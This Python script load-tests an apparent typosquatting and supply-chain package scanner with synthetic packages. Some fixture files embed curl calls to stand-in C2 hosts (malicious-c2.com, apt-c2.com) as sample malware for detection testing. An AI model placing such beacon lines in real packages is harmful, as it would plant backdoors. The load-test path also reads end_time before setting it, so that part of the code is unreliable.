#!/usr/bin/env python3
"""
Performance Tester for TypoSentinel Enterprise Environment
Conducts load testing and performance benchmarking
"""

import asyncio
import aiohttp
import time
import json
import argparse
import statistics
from datetime import datetime, timedelta
from typing import List, Dict, Any, Tuple
from concurrent.futures import ThreadPoolExecutor
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class PerformanceTester:
    """Conducts comprehensive performance testing of TypoSentinel"""
    
    def __init__(self, typosentinel_url: str = "http://typosentinel-scanner:8080"):
        self.typosentinel_url = typosentinel_url
        self.session = None
        self.results = {
            "start_time": None,
            "end_time": None,
            "total_requests": 0,
            "successful_requests": 0,
            "failed_requests": 0,
            "response_times": [],
            "throughput": 0,
            "error_rate": 0,
            "detection_accuracy": {},
            "resource_usage": {},
            "performance_metrics": {}
        }
    
    async def setup_session(self):
        """Setup HTTP session for testing"""
        connector = aiohttp.TCPConnector(limit=100, limit_per_host=50)
        timeout = aiohttp.ClientTimeout(total=30)
        self.session = aiohttp.ClientSession(connector=connector, timeout=timeout)
    
    async def cleanup_session(self):
        """Cleanup HTTP session"""
        if self.session:
            await self.session.close()
    
    async def send_package_for_analysis(self, package_data: Dict[str, Any]) -> Tuple[bool, float, Dict[str, Any]]:
        """Send a package for analysis and measure response time"""
        start_time = time.time()
        
        try:
            async with self.session.post(
                f"{self.typosentinel_url}/api/v1/analyze",
                json=package_data,
                headers={"Content-Type": "application/json"}
            ) as response:
                response_time = time.time() - start_time
                
                if response.status == 200:
                    result = await response.json()
                    return True, response_time, result
                else:
                    logger.warning(f"Request failed with status {response.status}")
                    return False, response_time, {}
                    
        except Exception as e:
            response_time = time.time() - start_time
            logger.error(f"Request failed with exception: {e}")
            return False, response_time, {}
    
    def generate_test_packages(self, count: int, attack_types: List[str]) -> List[Dict[str, Any]]:
        """Generate test packages for performance testing"""
        packages = []
        
        for i in range(count):
            # Generate different types of packages
            attack_type = attack_types[i % len(attack_types)]
            
            if attack_type == "typosquatting":
                package = self._generate_typosquatting_package(i)
            elif attack_type == "supply_chain":
                package = self._generate_supply_chain_package(i)
            elif attack_type == "nation_state":
                package = self._generate_nation_state_package(i)
            elif attack_type == "legitimate":
                package = self._generate_legitimate_package(i)
            else:
                package = self._generate_random_package(i)
            
            packages.append(package)
        
        return packages
    
    def _generate_typosquatting_package(self, index: int) -> Dict[str, Any]:
        """Generate typosquatting test package"""
        legitimate_packages = ["requests", "numpy", "pandas", "flask", "django"]
        target = legitimate_packages[index % len(legitimate_packages)]
        
        # Create typosquatted version
        typo_name = self._create_typo(target)
        
        return {
            "name": typo_name,
            "version": "1.0.0",
            "description": f"A package similar to {target}",
            "author": "test_author",
            "metadata": {
                "typosquatting_target": target,
                "attack_type": "typosquatting",
                "severity": "medium"
            },
            "dependencies": [target],
            "files": [
                {"name": "__init__.py", "content": "import requests\nprint('Installing...')"},
                {"name": "setup.py", "content": f"from setuptools import setup\nsetup(name='{typo_name}')"}
            ]
        }
    
    def _generate_supply_chain_package(self, index: int) -> Dict[str, Any]:
        """Generate supply chain attack test package"""
        return {
            "name": f"enterprise-utils-{index}",
            "version": "2.1.0",
            "description": "Enterprise utility package",
            "author": "enterprise_team",
            "metadata": {
                "attack_type": "supply_chain",
                "malicious_updates": True,
                "backdoor_present": True,
                "severity": "high"
            },
            "dependencies": ["cryptography", "requests"],
            "files": [
                {"name": "__init__.py", "content": "import os\nos.system('curl -s http://malicious-c2.com/collect')"},
                {"name": "utils.py", "content": "def enterprise_function(): pass"}
            ]
        }
    
    def _generate_nation_state_package(self, index: int) -> Dict[str, Any]:
        """Generate nation-state level attack test package"""
        return {
            "name": f"security-toolkit-{index}",
            "version": "3.0.0",
            "description": "Advanced security toolkit",
            "author": "security_research",
            "metadata": {
                "attack_type": "nation_state",
                "apt_group": "APT28",
                "zero_day_exploits": True,
                "anti_forensics": True,
                "quantum_cryptographic_attack": True,
                "severity": "critical"
            },
            "dependencies": ["pycryptodome", "paramiko"],
            "files": [
                {"name": "__init__.py", "content": "import subprocess\nsubprocess.run(['curl', 'http://apt-c2.com/beacon'])"},
                {"name": "exploit.py", "content": "class ZeroDayExploit: pass"}
            ]
        }
    
    def _generate_legitimate_package(self, index: int) -> Dict[str, Any]:
        """Generate legitimate test package"""
        return {
            "name": f"legitimate-package-{index}",
            "version": "1.0.0",
            "description": "A legitimate package for testing",
            "author": "legitimate_author",
            "metadata": {
                "attack_type": "legitimate",
                "severity": "none"
            },
            "dependencies": [],
            "files": [
                {"name": "__init__.py", "content": "def hello_world(): return 'Hello, World!'"},
                {"name": "README.md", "content": "# Legitimate Package\nThis is a legitimate package."}
            ]
        }
    
    def _generate_random_package(self, index: int) -> Dict[str, Any]:
        """Generate random test package"""
        return {
            "name": f"random-package-{index}",
            "version": "1.0.0",
            "description": "Random test package",
            "author": "test_author",
            "metadata": {
                "attack_type": "random",
                "severity": "low"
            },
            "dependencies": [],
            "files": [
                {"name": "__init__.py", "content": "pass"}
            ]
        }
    
    def _create_typo(self, original: str) -> str:
        """Create typosquatted version of package name"""
        import random
        
        typo_techniques = [
            lambda s: s.replace('e', '3'),  # Character substitution
            lambda s: s[:-1],               # Character omission
            lambda s: s + 's',              # Character addition
            lambda s: s.replace('o', '0'),  # Homoglyph substitution
            lambda s: s.replace('-', '_'),  # Separator change
        ]
        
        technique = random.choice(typo_techniques)
        return technique(original)
    
    async def run_load_test(self, concurrent_requests: int, total_requests: int, 
                           delay_between_requests: float) -> Dict[str, Any]:
        """Run load testing with specified parameters"""
        logger.info(f"Starting load test: {concurrent_requests} concurrent, {total_requests} total")
        
        self.results["start_time"] = datetime.now().isoformat()
        
        # Generate test packages
        attack_types = ["typosquatting", "supply_chain", "nation_state", "legitimate"]
        test_packages = self.generate_test_packages(total_requests, attack_types)
        
        # Setup session
        await self.setup_session()
        
        # Run concurrent requests
        semaphore = asyncio.Semaphore(concurrent_requests)
        tasks = []
        
        for package in test_packages:
            task = self._send_request_with_semaphore(semaphore, package, delay_between_requests)
            tasks.append(task)
        
        # Execute all requests
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Process results
        self._process_load_test_results(results, test_packages)
        
        await self.cleanup_session()
        
        self.results["end_time"] = datetime.now().isoformat()
        
        return self.results
    
    async def _send_request_with_semaphore(self, semaphore: asyncio.Semaphore, 
                                         package: Dict[str, Any], delay: float) -> Tuple[bool, float, Dict[str, Any]]:
        """Send request with semaphore control"""
        async with semaphore:
            if delay > 0:
                await asyncio.sleep(delay)
            return await self.send_package_for_analysis(package)
    
    def _process_load_test_results(self, results: List[Any], test_packages: List[Dict[str, Any]]):
        """Process load test results and calculate metrics"""
        successful_requests = 0
        failed_requests = 0
        response_times = []
        detection_results = {"true_positives": 0, "false_positives": 0, 
                           "true_negatives": 0, "false_negatives": 0}
        
        for i, result in enumerate(results):
            if isinstance(result, Exception):
                failed_requests += 1
                continue
            
            success, response_time, analysis_result = result
            response_times.append(response_time)
            
            if success:
                successful_requests += 1
                
                # Analyze detection accuracy
                expected_malicious = test_packages[i]["metadata"]["attack_type"] != "legitimate"
                detected_malicious = analysis_result.get("is_malicious", False)
                
                if expected_malicious and detected_malicious:
                    detection_results["true_positives"] += 1
                elif expected_malicious and not detected_malicious:
                    detection_results["false_negatives"] += 1
                elif not expected_malicious and detected_malicious:
                    detection_results["false_positives"] += 1
                else:
                    detection_results["true_negatives"] += 1
            else:
                failed_requests += 1
        
        # Calculate metrics
        total_requests = len(results)
        duration = (datetime.fromisoformat(self.results["end_time"]) - 
                   datetime.fromisoformat(self.results["start_time"])).total_seconds()
        
        self.results.update({
            "total_requests": total_requests,
            "successful_requests": successful_requests,
            "failed_requests": failed_requests,
            "response_times": response_times,
            "throughput": successful_requests / duration if duration > 0 else 0,
            "error_rate": failed_requests / total_requests if total_requests > 0 else 0,
            "detection_accuracy": self._calculate_detection_metrics(detection_results),
            "performance_metrics": self._calculate_performance_metrics(response_times)
        })
    
    def _calculate_detection_metrics(self, detection_results: Dict[str, int]) -> Dict[str, float]:
        """Calculate detection accuracy metrics"""
        tp = detection_results["true_positives"]
        fp = detection_results["false_positives"]
        tn = detection_results["true_negatives"]
        fn = detection_results["false_negatives"]
        
        total = tp + fp + tn + fn
        
        if total == 0:
            return {"accuracy": 0, "precision": 0, "recall": 0, "f1_score": 0}
        
        accuracy = (tp + tn) / total
        precision = tp / (tp + fp) if (tp + fp) > 0 else 0
        recall = tp / (tp + fn) if (tp + fn) > 0 else 0
        f1_score = 2 * (precision * recall) / (precision + recall) if (precision + recall) > 0 else 0
        
        return {
            "accuracy": accuracy,
            "precision": precision,
            "recall": recall,
            "f1_score": f1_score,
            "true_positives": tp,
            "false_positives": fp,
            "true_negatives": tn,
            "false_negatives": fn
        }
    
    def _calculate_performance_metrics(self, response_times: List[float]) -> Dict[str, float]:
        """Calculate performance metrics from response times"""
        if not response_times:
            return {"mean": 0, "median": 0, "p95": 0, "p99": 0, "min": 0, "max": 0}
        
        sorted_times = sorted(response_times)
        
        return {
            "mean": statistics.mean(response_times),
            "median": statistics.median(response_times),
            "p95": sorted_times[int(0.95 * len(sorted_times))],
            "p99": sorted_times[int(0.99 * len(sorted_times))],
            "min": min(response_times),
            "max": max(response_times)
        }
    
    async def run_stress_test(self, duration_minutes: int, max_concurrent: int) -> Dict[str, Any]:
        """Run stress testing for specified duration"""
        logger.info(f"Starting stress test: {duration_minutes} minutes, max {max_concurrent} concurrent")
        
        end_time = datetime.now() + timedelta(minutes=duration_minutes)
        stress_results = []
        
        await self.setup_session()
        
        while datetime.now() < end_time:
            # Gradually increase load
            current_concurrent = min(max_concurrent, len(stress_results) + 10)
            
            # Generate test batch
            test_packages = self.generate_test_packages(current_concurrent, 
                                                      ["typosquatting", "supply_chain", "nation_state", "legitimate"])
            
            # Run batch
            semaphore = asyncio.Semaphore(current_concurrent)
            tasks = [self._send_request_with_semaphore(semaphore, pkg, 0.1) for pkg in test_packages]
            
            batch_results = await asyncio.gather(*tasks, return_exceptions=True)
            stress_results.extend(batch_results)
            
            # Brief pause between batches
            await asyncio.sleep(1)
        
        await self.cleanup_session()
        
        # Process stress test results
        self._process_load_test_results(stress_results, 
                                      self.generate_test_packages(len(stress_results), 
                                                                 ["typosquatting", "supply_chain", "nation_state", "legitimate"]))
        
        return self.results
    
    def save_results(self, filename: str):
        """Save performance test results to file"""
        with open(filename, 'w') as f:
            json.dump(self.results, f, indent=2)
        
        logger.info(f"Performance test results saved to {filename}")

async def main():
    """Main entry point for performance testing"""
    parser = argparse.ArgumentParser(description="TypoSentinel Performance Tester")
    parser.add_argument("--intensity", choices=["low", "medium", "high", "enterprise"],
                       default="medium", help="Test intensity level")
    parser.add_argument("--concurrent", type=int, default=10,
                       help="Number of concurrent requests")
    parser.add_argument("--total", type=int, default=100,
                       help="Total number of requests")
    parser.add_argument("--delay", type=float, default=0.1,
                       help="Delay between requests in seconds")
    parser.add_argument("--duration", default="1 hour",
                       help="Test duration (for stress testing)")
    parser.add_argument("--test-type", choices=["load", "stress"], default="load",
                       help="Type of performance test")
    parser.add_argument("--output", default="/app/results/performance_test.json",
                       help="Output file for results")
    
    args = parser.parse_args()
    
    # Configure test parameters based on intensity
    intensity_configs = {
        "low": {"concurrent": 5, "total": 50, "delay": 2.0},
        "medium": {"concurrent": 15, "total": 200, "delay": 1.0},
        "high": {"concurrent": 30, "total": 500, "delay": 0.5},
        "enterprise": {"concurrent": 50, "total": 1000, "delay": 0.1}
    }
    
    if args.intensity in intensity_configs:
        config = intensity_configs[args.intensity]
        concurrent = config["concurrent"]
        total = config["total"]
        delay = config["delay"]
    else:
        concurrent = args.concurrent
        total = args.total
        delay = args.delay
    
    # Run performance test
    tester = PerformanceTester()
    
    if args.test_type == "load":
        results = await tester.run_load_test(concurrent, total, delay)
    else:
        # Parse duration for stress test
        duration_minutes = 60  # Default 1 hour
        if "hour" in args.duration:
            duration_minutes = int(args.duration.split()[0]) * 60
        elif "minute" in args.duration:
            duration_minutes = int(args.duration.split()[0])
        
        results = await tester.run_stress_test(duration_minutes, concurrent)
    
    # Save results
    tester.save_results(args.output)
    
    # Print summary
    print(f"Performance Test Results ({args.intensity} intensity):")
    print(f"Total Requests: {results['total_requests']}")
    print(f"Successful Requests: {results['successful_requests']}")
    print(f"Error Rate: {results['error_rate']:.2%}")
    print(f"Throughput: {results['throughput']:.2f} requests/second")
    print(f"Detection Accuracy: {results['detection_accuracy']['accuracy']:.2%}")
    print(f"Mean Response Time: {results['performance_metrics']['mean']:.3f}s")
    print(f"95th Percentile: {results['performance_metrics']['p95']:.3f}s")

if __name__ == "__main__":
    asyncio.run(main())